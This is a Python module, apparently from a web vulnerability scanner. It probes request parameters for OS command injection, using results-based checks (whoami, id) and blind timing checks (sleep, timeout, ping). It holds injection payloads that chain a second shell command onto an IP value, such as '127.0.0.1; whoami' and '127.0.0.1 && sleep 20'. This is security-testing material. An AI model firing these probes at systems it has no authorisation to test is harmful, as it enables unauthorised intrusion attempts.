import re
import time
from typing import List, Dict, Any, Tuple, Optional

from core.http import HTTPClient
from core.targets import Target


# ============================================================
# Config
# ============================================================

BLIND_SLEEP = 20
# How much of the sleep we require to consider it "real" (handles jitter).
# Example: 20s sleep => require >= 12s extra delay over baseline.
BLIND_DIFF_RATIO = 0.60
BASELINE_SAMPLES = 3
TIMEOUT_BUFFER = 12  # seconds added to client timeout for blind probes


# ============================================================
# Request helpers
# ============================================================

def _send(client: HTTPClient, t: Target, values: Dict[str, str]) -> Tuple[int, str, float, str]:
    method = (t.method or "GET").upper().strip()

    payload: Dict[str, Any] = {}
    payload.update(t.hidden or {})
    payload.update(values or {})

    if method in ("GET", "DELETE"):
        return client.request(method, t.url, params=payload)

    if getattr(t, "is_json", False):
        return client.request(method, t.url, json=payload)

    return client.request(method, t.url, data=payload)


def _timed_send(client: HTTPClient, t: Target, values: Dict[str, str]) -> Tuple[int, str, float, str]:
    """
    Measure elapsed time ourselves (in addition to whatever HTTPClient returns),
    so blind detection is robust.
    """
    start = time.perf_counter()
    status, body, _, final_url = _send(client, t, values)
    elapsed = time.perf_counter() - start
    return status, body, elapsed, final_url


# ============================================================
# Output extraction (only for results-based detection)
# ============================================================

OUTPUT_RE = re.compile(r"Output:\s*(.*)", re.I | re.S)
PRE_RE = re.compile(r"<pre[^>]*>(.*?)</pre>", re.I | re.S)


def _extract_output(body: str) -> str:
    """
    Prefer Output: region (NetTools-like), else <pre> (your lab).
    This prevents SSTI fields / reflected input from causing OS false positives.
    """
    if not body:
        return ""

    m = OUTPUT_RE.search(body)
    if m:
        return m.group(1)

    p = PRE_RE.search(body)
    if p:
        return p.group(1)

    # If neither exists, we return empty string rather than whole HTML,
    # to avoid reflection-based false positives.
    return ""


# ============================================================
# Results-based OS injection detection (keeps your current method)
# ============================================================

# Windows whoami often looks like DESKTOP\user, domain\user, etc.
WHOAMI_WIN_RE = re.compile(r"^[A-Za-z0-9._-]+\\[A-Za-z0-9._-]+$", re.M)
# Linux/mac whoami often a simple username
WHOAMI_NIX_RE = re.compile(r"^[a-z_][a-z0-9_-]{0,31}$", re.M | re.I)
# id output contains uid=...
ID_RE = re.compile(r"uid=\d+", re.M)


def _detect_results(output: str, baseline: str) -> bool:
    if not output:
        return False

    # Must differ from baseline (baseline usually empty for these labs)
    if baseline and output == baseline:
        return False

    # Strong signals:
    if ID_RE.search(output) and not ID_RE.search(baseline or ""):
        return True

    if WHOAMI_WIN_RE.search(output) and not WHOAMI_WIN_RE.search(baseline or ""):
        return True

    if WHOAMI_NIX_RE.search(output) and not WHOAMI_NIX_RE.search(baseline or ""):
        return True

    return False


def _result_probes() -> List[Dict[str, str]]:
    base = "127.0.0.1"
    return [
        {"type": "whoami_semicolon", "payload": f"{base}; whoami"},
        {"type": "whoami_andand",    "payload": f"{base} && whoami"},
        {"type": "whoami_amp",       "payload": f"{base} & whoami"},
        {"type": "id_semicolon",     "payload": f"{base}; id"},
        {"type": "id_andand",        "payload": f"{base} && id"},
        {"type": "id_amp",           "payload": f"{base} & id"},
    ]


# ============================================================
# Blind time-based OS injection detection
# ============================================================

def _blind_probes() -> List[Dict[str, str]]:
    base = "127.0.0.1"
    s = BLIND_SLEEP
    return [
        # Linux/mac
        {"type": "sleep_semicolon", "payload": f"{base}; sleep {s}"},
        {"type": "sleep_andand",    "payload": f"{base} && sleep {s}"},
        # Windows timeout (built-in)
        {"type": "timeout_amp",     "payload": f"{base} & timeout /T {s} /NOBREAK"},
        {"type": "timeout_andand",  "payload": f"{base} && timeout /T {s} /NOBREAK"},
        # Windows ping delay fallback
        {"type": "ping_amp",        "payload": f"{base} & ping -n {s+1} 127.0.0.1"},
    ]


def _measure_baseline(client: HTTPClient, t: Target) -> Optional[float]:
    times: List[float] = []
    for _ in range(BASELINE_SAMPLES):
        try:
            _, _, elapsed, _ = _timed_send(client, t, {})
            times.append(elapsed)
        except Exception:
            continue

    if not times:
        return None
    return sum(times) / len(times)


def _detect_blind(client: HTTPClient, t: Target, param: str) -> Tuple[bool, int, Optional[float]]:
    """
    Blind detection is ONLY timing-based.
    We temporarily increase client.timeout so 20s sleeps don't get cut off at 15s.
    """
    original_timeout = getattr(client, "timeout", 15)
    needed_timeout = max(original_timeout, BLIND_SLEEP + TIMEOUT_BUFFER)

    # Temporarily increase
    client.timeout = needed_timeout

    try:
        baseline = _measure_baseline(client, t)
        if baseline is None:
            return False, 0, None

        threshold = baseline + (BLIND_SLEEP * BLIND_DIFF_RATIO)
        pass_count = 0

        for pr in _blind_probes():
            payload = pr["payload"]
            try:
                _, _, elapsed, _ = _timed_send(client, t, {param: payload})
            except Exception:
                # If request errors/timeouts, just treat as not proven
                continue

            if elapsed >= threshold:
                pass_count += 1

        return pass_count > 0, pass_count, baseline

    finally:
        # Restore original timeout so we don't affect other engines / crawling
        client.timeout = original_timeout


# ============================================================
# Main scan entry
# ============================================================

def os_injection_scan(client: HTTPClient, targets: List[Target]) -> List[Dict[str, Any]]:
    results: List[Dict[str, Any]] = []

    for t in targets:
        params = list(getattr(t, "params", []) or [])
        if not params:
            continue

        # Baseline body for output-based comparison (results-based only)
        try:
            b_status, b_body, _, b_url = _send(client, t, {})
        except Exception:
            continue

        baseline_output = _extract_output(b_body or "")

        for p in params:
            # ----------------------------
            # 1) Results-based detection
            # ----------------------------
            result_pass = 0
            result_probe_results: List[Dict[str, Any]] = []

            for pr in _result_probes():
                payload = pr["payload"]
                try:
                    s_status, s_body, _, s_url = _send(client, t, {p: payload})
                except Exception:
                    result_probe_results.append({
                        "type": pr["type"],
                        "payload": payload,
                        "status": 0,
                        "final_url": t.url,
                        "exec_present": False,
                        "error": "probe_request_failed",
                    })
                    continue

                out = _extract_output(s_body or "")
                exec_present = _detect_results(out, baseline_output)

                if exec_present:
                    result_pass += 1

                result_probe_results.append({
                    "type": pr["type"],
                    "payload": payload,
                    "status": s_status,
                    "final_url": s_url,
                    "exec_present": exec_present,
                })

            if result_pass > 0:
                results.append({
                    "target": t.to_dict(),
                    "param": p,
                    "baseline": {"status": b_status, "final_url": b_url, "len": len(b_body or "")},
                    "os_probes": result_probe_results,
                    "verdict": {
                        "vulnerable": True,
                        "confidence": min(100, 60 + result_pass * 10),
                        "method": "results-based",
                        "result_pass": result_pass,
                        "blind_pass": 0,
                    },
                })
                continue

            # ----------------------------
            # 2) Blind time-based detection
            # ----------------------------
            blind_vuln, blind_pass, baseline_time = _detect_blind(client, t, p)

            results.append({
                "target": t.to_dict(),
                "param": p,
                "baseline": {
                    "status": b_status,
                    "final_url": b_url,
                    "len": len(b_body or ""),
                    "baseline_time_s": baseline_time,
                },
                "os_probes": result_probe_results,  # keep the probes list for consistency
                "verdict": {
                    "vulnerable": bool(blind_vuln),
                    "confidence": 90 if blind_vuln else 0,
                    "method": "blind-time-based" if blind_vuln else "none",
                    "result_pass": 0,
                    "blind_pass": blind_pass,
                    "sleep_s": BLIND_SLEEP,
                },
            })

    return results